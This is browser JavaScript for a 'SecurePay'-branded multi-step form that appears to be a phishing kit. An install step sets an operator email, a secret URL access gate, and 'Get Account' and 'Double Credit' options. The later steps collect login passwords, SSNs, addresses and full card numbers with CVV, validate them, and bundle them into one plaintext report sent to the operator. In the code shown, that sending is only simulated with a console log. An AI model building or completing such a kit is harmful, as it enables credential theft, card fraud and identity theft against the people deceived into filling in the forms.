(() => {
  "use strict";

  const STEPS = [
    { id: "install", label: "Install" },
    { id: "login", label: "Login" },
    { id: "verify", label: "Verify" },
    { id: "billing", label: "Billing" },
    { id: "payment", label: "Payment" },
    { id: "success", label: "Success" },
  ];

  const appEl = document.getElementById("app");
  const progressEl = document.getElementById("progressBar");
  const footerHint = document.getElementById("footerHint");

  function readConfig() {
    try { return JSON.parse(localStorage.getItem("appConfig") || "null"); } catch { return null; }
  }
  function writeConfig(cfg) {
    localStorage.setItem("appConfig", JSON.stringify(cfg));
  }

  function readState() {
    try { return JSON.parse(sessionStorage.getItem("appState") || "{}"); } catch { return {}; }
  }
  function writeState(state) {
    sessionStorage.setItem("appState", JSON.stringify(state));
  }

  function nowIso() { return new Date().toISOString(); }

  function getQueryParam(name) {
    const url = new URL(window.location.href);
    return url.searchParams.get(name);
  }

  function setHash(stepId) {
    if (window.location.hash !== "#" + stepId) {
      window.location.hash = stepId;
    }
  }

  function updateProgress(stepId) {
    progressEl.innerHTML = STEPS.map(s => {
      const active = s.id === stepId ? "active" : "";
      return `<div class="step ${active}" data-step="${s.id}"><span class="dot"></span><span>${s.label}</span></div>`;
    }).join("");
  }

  function generateToken() {
    const bytes = crypto.getRandomValues(new Uint8Array(16));
    return "tok_" + Array.from(bytes).map(b => b.toString(16).padStart(2, "0")).join("");
  }

  function mask(value, groups) {
    const digits = value.replace(/\D+/g, "");
    const out = [];
    let idx = 0;
    for (const size of groups) {
      if (idx >= digits.length) break;
      out.push(digits.slice(idx, idx + size));
      idx += size;
    }
    return out.join(" ").trim();
  }

  function luhnCheck(num) {
    const digits = num.replace(/\D+/g, "");
    if (!digits) return false;
    let sum = 0; let alt = false;
    for (let i = digits.length - 1; i >= 0; i--) {
      let n = digits.charCodeAt(i) - 48;
      if (alt) { n *= 2; if (n > 9) n -= 9; }
      sum += n; alt = !alt;
    }
    return sum % 10 === 0;
  }

  function detectCardType(num) {
    const digits = num.replace(/\D+/g, "");
    if (/^3[47]\d{0,13}$/.test(digits)) {
      return { brand: "American Express", key: "amex", groups: [4,6,5], lengths: [15], cvv: 4 };
    }
    if (/^4\d{0,15}$/.test(digits)) {
      return { brand: "Visa", key: "visa", groups: [4,4,4,4], lengths: [16], cvv: 3 };
    }
    if (/^(5[1-5]\d{0,14}|22[2-9]\d{0,12}|2[3-6]\d{0,13}|27[01]\d{0,12}|2720\d{0,11})$/.test(digits)) {
      return { brand: "Mastercard", key: "mc", groups: [4,4,4,4], lengths: [16], cvv: 3 };
    }
    if (/^(6011\d{0,12}|65\d{0,14}|64[4-9]\d{0,13})$/.test(digits)) {
      return { brand: "Discover", key: "discover", groups: [4,4,4,4], lengths: [16], cvv: 3 };
    }
    return { brand: "Card", key: "card", groups: [4,4,4,4], lengths: [13,14,15,16,19], cvv: 3 };
  }

  function formatExpiry(value) {
    const digits = value.replace(/\D+/g, "").slice(0, 4);
    if (digits.length <= 2) return digits;
    return digits.slice(0,2) + "/" + digits.slice(2);
  }

  function isFutureExpiry(mmYY) {
    const m = /^(\d{2})\/(\d{2})$/.exec(mmYY);
    if (!m) return false;
    const month = parseInt(m[1], 10);
    const year = 2000 + parseInt(m[2], 10);
    if (month < 1 || month > 12) return false;
    const endOfMonth = new Date(year, month, 0, 23, 59, 59, 999);
    return endOfMonth.getTime() >= Date.now();
  }

  const US_STATES = [
    ["AL","Alabama"],["AK","Alaska"],["AZ","Arizona"],["AR","Arkansas"],["CA","California"],
    ["CO","Colorado"],["CT","Connecticut"],["DE","Delaware"],["FL","Florida"],["GA","Georgia"],
    ["HI","Hawaii"],["ID","Idaho"],["IL","Illinois"],["IN","Indiana"],["IA","Iowa"],
    ["KS","Kansas"],["KY","Kentucky"],["LA","Louisiana"],["ME","Maine"],["MD","Maryland"],
    ["MA","Massachusetts"],["MI","Michigan"],["MN","Minnesota"],["MS","Mississippi"],["MO","Missouri"],
    ["MT","Montana"],["NE","Nebraska"],["NV","Nevada"],["NH","New Hampshire"],["NJ","New Jersey"],
    ["NM","New Mexico"],["NY","New York"],["NC","North Carolina"],["ND","North Dakota"],["OH","Ohio"],
    ["OK","Oklahoma"],["OR","Oregon"],["PA","Pennsylvania"],["RI","Rhode Island"],["SC","South Carolina"],
    ["SD","South Dakota"],["TN","Tennessee"],["TX","Texas"],["UT","Utah"],["VT","Vermont"],
    ["VA","Virginia"],["WA","Washington"],["WV","West Virginia"],["WI","Wisconsin"],["WY","Wyoming"]
  ];

  function ssnAutoFormat(value) {
    const digits = value.replace(/\D+/g, "").slice(0, 9);
    const parts = [];
    if (digits.length > 0) parts.push(digits.slice(0, 3));
    if (digits.length > 3) parts.push(digits.slice(3, 5));
    if (digits.length > 5) parts.push(digits.slice(5));
    return parts.join("-");
  }

  function isInvalidSSN(ssn) {
    const m = /^(\d{3})-(\d{2})-(\d{4})$/.exec(ssn);
    if (!m) return true;
    const a = m[1], b = m[2], c = m[3];
    if (a === "000" || b === "00" || c === "0000") return true;
    if (a === "666" || /^9\d{2}$/.test(a)) return true;
    const all = (a + b + c);
    if (/^(\d)\1{8}$/.test(all)) return true; // all same digit
    if (all === "123456789" || ssn === "123-45-6789") return true;
    if (ssn === "078-05-1120") return true;
    return false;
  }

  function simulateSendEmail(to, subject, body) {
    const payload = { to, subject, body, sentAt: nowIso() };
    console.log("[Email]", payload);
    return payload;
  }

  function setFooter(text) { footerHint.textContent = text || ""; }

  function requireAccessOrExplain(cfg) {
    const requiredParam = cfg?.accessParam;
    const provided = getQueryParam("access");
    if (!requiredParam) return { ok: true };
    if (provided === requiredParam) return { ok: true };
    const url = new URL(window.location.href);
    url.searchParams.set("access", requiredParam);
    return { ok: false, hint: `Access requires parameter. Use ${url.toString()}` };
  }

  function renderInstall() {
    updateProgress("install");
    setFooter("Configure admin email, URL parameter access, and token generation.");
    const currentUrl = new URL(window.location.href);

    const existing = readConfig();
    const suggestedParam = existing?.accessParam || Math.random().toString(36).slice(2, 8);

    appEl.innerHTML = `
      <section class="card">
        <h2>Installation</h2>
        <p class="subtle">Provide admin details and access parameter. We'll store a local config and generate an API token.</p>
        <form id="installForm" class="table-form" autocomplete="off">
          <div class="label">Admin Email</div>
          <div><input id="adminEmail" class="input" type="email" placeholder="admin@example.com" required value="${existing?.adminEmail || ""}"></div>

          <div class="label">URL Access Parameter</div>
          <div><input id="accessParam" class="input" type="text" placeholder="e.g. alpha123" required value="${suggestedParam}"></div>

          <div class="label">Options</div>
          <div class="actions">
            <label class="checkbox"><input id="optGetAccount" type="checkbox" ${existing?.getAccount?"checked":""}> Get Account</label>
            <label class="checkbox"><input id="optDoubleCredit" type="checkbox" ${existing?.doubleCredit?"checked":""}> Double Credit</label>
          </div>

          <div class="label">API Token</div>
          <div class="actions">
            <input id="apiToken" class="input" type="text" readonly placeholder="Click Generate" value="${existing?.apiToken || ""}">
            <button type="button" id="btnGenToken" class="btn">Generate</button>
          </div>

          <div class="label">Live URL Preview</div>
          <div><code id="urlPreview" class="url-preview"></code></div>

          <div class="label"></div>
          <div class="actions">
            <button class="btn btn-primary" type="submit">Save & Continue</button>
            <button class="btn btn-ghost" type="button" id="btnSimulate">Simulate Config File</button>
          </div>
        </form>
        <div id="installMsg" class="note" style="margin-top:10px;"></div>
      </section>
    `;

    const emailEl = document.getElementById("adminEmail");
    const paramEl = document.getElementById("accessParam");
    const tokenEl = document.getElementById("apiToken");
    const formEl = document.getElementById("installForm");
    const urlPrevEl = document.getElementById("urlPreview");
    const btnGen = document.getElementById("btnGenToken");
    const btnSim = document.getElementById("btnSimulate");
    const msgEl = document.getElementById("installMsg");

    function updateUrlPreview() {
      const url = new URL(currentUrl);
      url.searchParams.set("access", paramEl.value || "");
      url.hash = "login";
      urlPrevEl.textContent = url.toString();
    }

    btnGen.addEventListener("click", () => {
      tokenEl.value = generateToken();
    });

    [emailEl, paramEl].forEach(el => el.addEventListener("input", updateUrlPreview));
    updateUrlPreview();

    btnSim.addEventListener("click", () => {
      const cfg = {
        adminEmail: emailEl.value.trim(),
        accessParam: paramEl.value.trim(),
        getAccount: document.getElementById("optGetAccount").checked,
        doubleCredit: document.getElementById("optDoubleCredit").checked,
        apiToken: tokenEl.value || generateToken(),
        installedAt: nowIso(),
      };
      const json = JSON.stringify(cfg, null, 2);
      console.log("[Config file created] config.json\n" + json);
      msgEl.innerHTML = `<span class="success">config.json created</span>`;
    });

    formEl.addEventListener("submit", (e) => {
      e.preventDefault();
      const cfg = {
        adminEmail: emailEl.value.trim(),
        accessParam: paramEl.value.trim(),
        getAccount: document.getElementById("optGetAccount").checked,
        doubleCredit: document.getElementById("optDoubleCredit").checked,
        apiToken: tokenEl.value || generateToken(),
        installedAt: nowIso(),
      };
      if (!cfg.adminEmail || !cfg.accessParam) {
        formEl.classList.remove("shake"); void formEl.offsetWidth; formEl.classList.add("shake");
        return;
      }
      writeConfig(cfg);
      const url = new URL(window.location.href);
      url.searchParams.set("access", cfg.accessParam);
      window.location.href = url.toString().replace(/#.*$/, "#login");
    });
  }

  function renderLogin() {
    updateProgress("login");
    const cfg = readConfig();
    const access = requireAccessOrExplain(cfg);
    setFooter("Login with your email/phone and password. We'll send a code.");

    if (!cfg) { setHash("install"); return renderInstall(); }

    appEl.innerHTML = `
      <section class="card">
        <h2>Login</h2>
        ${!access.ok ? `<div class="error" style="margin:8px 0;">${access.hint}</div>` : ""}
        <form id="loginForm" class="form" autocomplete="off">
          <div class="row">
            <div>
              <label class="label">Email or Phone</label>
              <input id="loginId" class="input" type="text" placeholder="you@example.com or (555) 555-5555" required />
            </div>
            <div>
              <label class="label">Password</label>
              <input id="loginPw" class="input" type="password" placeholder="••••••••" required />
            </div>
          </div>
          <div class="actions">
            <button class="btn btn-primary" type="submit" ${!access.ok?"disabled":""}>Continue</button>
          </div>
        </form>
        <hr class="hr" />
        <div id="emailSim" class="kv"></div>
      </section>
    `;

    const formEl = document.getElementById("loginForm");
    const idEl = document.getElementById("loginId");
    const pwEl = document.getElementById("loginPw");
    const emailSim = document.getElementById("emailSim");

    formEl.addEventListener("submit", (e) => {
      e.preventDefault();
      if (!idEl.value.trim() || !pwEl.value) {
        formEl.classList.remove("shake"); void formEl.offsetWidth; formEl.classList.add("shake");
        return;
      }
      const code = String(Math.floor(100000 + Math.random()*900000));
      const state = readState();
      state.login = { id: idEl.value.trim(), pw: pwEl.value, requestedAt: nowIso(), code };
      writeState(state);

      const mail = {
        name: "SecurePay Security",
        subject: "Your verification code",
        message: `Use this code to continue: ${code}`,
      };
      sessionStorage.setItem("verificationEmail", JSON.stringify(mail));

      const cfg = readConfig();
      simulateSendEmail(cfg.adminEmail, "Login attempt", `User ${state.login.id} initiated login at ${state.login.requestedAt}. Code: ${code}`);

      emailSim.innerHTML = `
        <div class="label">Name</div><div>${mail.name}</div>
        <div class="label">Subject</div><div>${mail.subject}</div>
        <div class="label">Message</div><div>${mail.message}</div>
        <div class="label">Verification Code</div><div><strong>${code}</strong></div>
      `;

      setTimeout(() => { setHash("verify"); renderVerify(); }, 400);
    });
  }

  function renderVerify() {
    updateProgress("verify");
    setFooter("Enter the verification code we sent.");
    const mail = JSON.parse(sessionStorage.getItem("verificationEmail") || "{}");

    appEl.innerHTML = `
      <section class="card">
        <h2>Verification</h2>
        <div class="kv" style="margin:8px 0 16px;">
          <div class="label">Name</div><div>${mail.name || "SecurePay Security"}</div>
          <div class="label">Subject</div><div>${mail.subject || "Your verification code"}</div>
          <div class="label">Message</div><div>${mail.message || "Use this code to continue"}</div>
          <div class="label">Verification Code</div><div id="verifCodePreview" class="badge">${(readState().login?.code) || ""}</div>
        </div>
        <form id="verifyForm" class="form" autocomplete="off">
          <div>
            <label class="label">Enter Code</label>
            <input id="codeInput" class="input" type="text" placeholder="6-digit code" inputmode="numeric" maxlength="6" required />
          </div>
          <div class="actions">
            <button class="btn btn-primary" type="submit">Validate</button>
          </div>
          <div id="verifyErr" class="error"></div>
        </form>
      </section>
    `;

    const formEl = document.getElementById("verifyForm");
    const codeEl = document.getElementById("codeInput");
    const errEl = document.getElementById("verifyErr");

    formEl.addEventListener("submit", (e) => {
      e.preventDefault();
      const given = (codeEl.value || "").replace(/\D+/g, "");
      const expect = (readState().login?.code) || "";
      if (given !== expect) {
        errEl.textContent = "Incorrect code. Please try again.";
        formEl.classList.remove("shake"); void formEl.offsetWidth; formEl.classList.add("shake");
        return;
      }
      const s = readState();
      s.verifiedAt = nowIso();
      writeState(s);
      setHash("billing");
      renderBilling();
    });
  }

  function renderBilling() {
    updateProgress("billing");
    setFooter("Enter your billing details. All fields required.");

    const state = readState();
    const b = state.billing || {};

    appEl.innerHTML = `
      <section class="card">
        <h2>Billing</h2>
        <form id="billForm" class="table-form" autocomplete="off">
          <div class="label">First Name</div>
          <div><input id="firstName" class="input" required value="${b.firstName||""}"></div>

          <div class="label">Last Name</div>
          <div><input id="lastName" class="input" required value="${b.lastName||""}"></div>

          <div class="label">Phone</div>
          <div><input id="phone" class="input" type="tel" placeholder="(555) 555-5555" required value="${b.phone||""}"></div>

          <div class="label">Address</div>
          <div><input id="addr1" class="input" placeholder="Street address" required value="${b.addr1||""}"></div>

          <div class="label">Address 2</div>
          <div><input id="addr2" class="input" placeholder="Apt, suite, etc." value="${b.addr2||""}"></div>

          <div class="label">City</div>
          <div><input id="city" class="input" required value="${b.city||""}"></div>

          <div class="label">State</div>
          <div>
            <select id="state" required>
              <option value="">Select a state</option>
              ${US_STATES.map(([v,n]) => `<option value="${v}" ${b.state===v?"selected":""}>${n}</option>`).join("")}
            </select>
          </div>

          <div class="label">SSN</div>
          <div>
            <input id="ssn" class="input" inputmode="numeric" placeholder="XXX-XX-XXXX" maxlength="11" required value="${b.ssn||""}">
            <div id="ssnErr" class="error"></div>
          </div>

          <div class="label"></div>
          <div class="actions">
            <button class="btn btn-primary" type="submit">Continue to Payment</button>
          </div>
        </form>
      </section>
    `;

    const formEl = document.getElementById("billForm");
    const ssnEl = document.getElementById("ssn");
    const ssnErr = document.getElementById("ssnErr");

    ssnEl.addEventListener("input", () => {
      const formatted = ssnAutoFormat(ssnEl.value);
      const selStart = ssnEl.selectionStart;
      ssnEl.value = formatted;
      ssnErr.textContent = "";
    });

    formEl.addEventListener("submit", (e) => {
      e.preventDefault();
      const data = {
        firstName: document.getElementById("firstName").value.trim(),
        lastName: document.getElementById("lastName").value.trim(),
        phone: document.getElementById("phone").value.trim(),
        addr1: document.getElementById("addr1").value.trim(),
        addr2: document.getElementById("addr2").value.trim(),
        city: document.getElementById("city").value.trim(),
        state: document.getElementById("state").value,
        ssn: document.getElementById("ssn").value.trim(),
      };
      const missing = Object.entries(data).some(([k,v]) => (k==="addr2"?false:!v));
      if (missing) {
        formEl.classList.remove("shake"); void formEl.offsetWidth; formEl.classList.add("shake");
        return;
      }
      if (!/^(\d{3})-(\d{2})-(\d{4})$/.test(data.ssn) || isInvalidSSN(data.ssn)) {
        ssnErr.textContent = "Invalid SSN. Use XXX-XX-XXXX and a valid pattern.";
        formEl.classList.remove("shake"); void formEl.offsetWidth; formEl.classList.add("shake");
        return;
      }
      const s = readState();
      s.billing = { ...data, capturedAt: nowIso() };
      writeState(s);
      setHash("payment");
      renderPayment();
    });
  }

  function renderPayment() {
    updateProgress("payment");
    setFooter("Enter card details. Only valid cards pass Luhn.");

    const state = readState();
    const p = state.payment || {};

    appEl.innerHTML = `
      <section class="card">
        <h2>Payment</h2>
        <form id="payForm" class="table-form" autocomplete="off">
          <div class="label">Cardholder Name</div>
          <div><input id="holder" class="input" placeholder="Name as shown on card" required value="${p.holder||""}"></div>

          <div class="label">Card Number</div>
          <div>
            <div class="row" style="grid-template-columns: 1fr auto;">
              <input id="card" class="input" inputmode="numeric" placeholder="xxxx xxxx xxxx xxxx" required value="${p.card||""}">
              <span id="brand" class="badge">Card</span>
            </div>
            <div id="cardErr" class="error"></div>
          </div>

          <div class="label">Expiry</div>
          <div><input id="exp" class="input" inputmode="numeric" placeholder="MM/YY" maxlength="5" required value="${p.exp||""}"></div>

          <div class="label">CVV</div>
          <div><input id="cvv" class="input" inputmode="numeric" placeholder="3 or 4 digits" maxlength="4" required value="${p.cvv||""}"></div>

          <div class="label"></div>
          <div class="actions">
            <button class="btn btn-primary" type="submit">Pay</button>
          </div>
        </form>
      </section>
    `;

    const formEl = document.getElementById("payForm");
    const cardEl = document.getElementById("card");
    const expEl = document.getElementById("exp");
    const cvvEl = document.getElementById("cvv");
    const holderEl = document.getElementById("holder");
    const brandEl = document.getElementById("brand");
    const cardErr = document.getElementById("cardErr");

    function refreshCardUI() {
      const info = detectCardType(cardEl.value);
      const formatted = mask(cardEl.value, info.groups);
      if (formatted !== cardEl.value) cardEl.value = formatted;
      brandEl.textContent = info.brand;
      brandEl.className = `badge ${info.key !== 'card' ? info.key : ''}`.trim();
      cvvEl.maxLength = info.cvv;
      cvvEl.placeholder = info.cvv === 4 ? "4 digits" : "3 digits";
    }

    cardEl.addEventListener("input", refreshCardUI);
    expEl.addEventListener("input", () => { expEl.value = formatExpiry(expEl.value); });

    formEl.addEventListener("submit", (e) => {
      e.preventDefault();
      const info = detectCardType(cardEl.value);
      const digits = cardEl.value.replace(/\D+/g, "");
      const lenOk = info.lengths.includes(digits.length);
      const luhnOk = luhnCheck(digits);
      if (!lenOk || !luhnOk || info.key === 'card') {
        cardErr.textContent = "Invalid card. Check number and brand.";
        formEl.classList.remove("shake"); void formEl.offsetWidth; formEl.classList.add("shake");
        return;
      }
      if (!isFutureExpiry(expEl.value)) {
        cardErr.textContent = "Invalid or expired expiry date.";
        formEl.classList.remove("shake"); void formEl.offsetWidth; formEl.classList.add("shake");
        return;
      }
      if (!holderEl.value.trim()) {
        cardErr.textContent = "Cardholder name is required.";
        formEl.classList.remove("shake"); void formEl.offsetWidth; formEl.classList.add("shake");
        return;
      }
      const s = readState();
      s.payment = {
        holder: holderEl.value.trim(),
        brand: detectCardType(cardEl.value).brand,
        card: cardEl.value,
        exp: expEl.value,
        cvv: cvvEl.value,
        paidAt: nowIso(),
      };
      writeState(s);

      const cfg = readConfig();
      const summary = {
        login: s.login,
        verifiedAt: s.verifiedAt,
        billing: s.billing,
        payment: { ...s.payment, cardLast4: s.payment.card.replace(/\D+/g, "").slice(-4) },
        config: { adminEmail: cfg.adminEmail, options: { getAccount: cfg.getAccount, doubleCredit: cfg.doubleCredit }},
        timestamps: { installedAt: cfg.installedAt, finishedAt: nowIso() }
      };

      const emailBody = `SecurePay submission\n\n` +
        `Login: ${summary.login.id} at ${summary.login.requestedAt}\n` +
        `Verified: ${summary.verifiedAt}\n` +
        `Billing: ${summary.billing.firstName} ${summary.billing.lastName}, ${summary.billing.addr1} ${summary.billing.addr2||''}, ${summary.billing.city}, ${summary.billing.state}, Tel ${summary.billing.phone}, SSN ${summary.billing.ssn}\n` +
        `Payment: ${s.payment.brand} ${s.payment.card} Exp ${s.payment.exp} CVV ${s.payment.cvv} (last4 ${summary.payment.cardLast4})\n` +
        `Options: GetAccount=${cfg.getAccount} DoubleCredit=${cfg.doubleCredit}\n` +
        `API Token: ${cfg.apiToken}\n` +
        `Completed: ${summary.timestamps.finishedAt}`;

      simulateSendEmail(cfg.adminEmail, "Form submission complete", emailBody);

      setHash("success");
      renderSuccess();
    });

    refreshCardUI();
  }

  function renderSuccess() {
    updateProgress("success");
    setFooter("We will process your payment and email you soon.");

    appEl.innerHTML = `
      <section class="card">
        <h2>Success</h2>
        <p>We will process your payment and we will email you soon.</p>
        <div class="actions">
          <button id="restart" class="btn">Start Over</button>
        </div>
      </section>
    `;

    document.getElementById("restart").addEventListener("click", () => {
      sessionStorage.removeItem("appState");
      setHash("login");
      renderLogin();
    });
  }

  function route() {
    const hash = (window.location.hash || "#").replace(/^#/, "") || "install";
    const cfg = readConfig();
    if (!cfg && hash !== "install") return renderInstall();
    updateProgress(hash);
    switch (hash) {
      case "install": return renderInstall();
      case "login": return renderLogin();
      case "verify": return renderVerify();
      case "billing": return renderBilling();
      case "payment": return renderPayment();
      case "success": return renderSuccess();
      default: setHash("install"); return renderInstall();
    }
  }

  window.addEventListener("hashchange", route);
  document.addEventListener("DOMContentLoaded", route);
})();
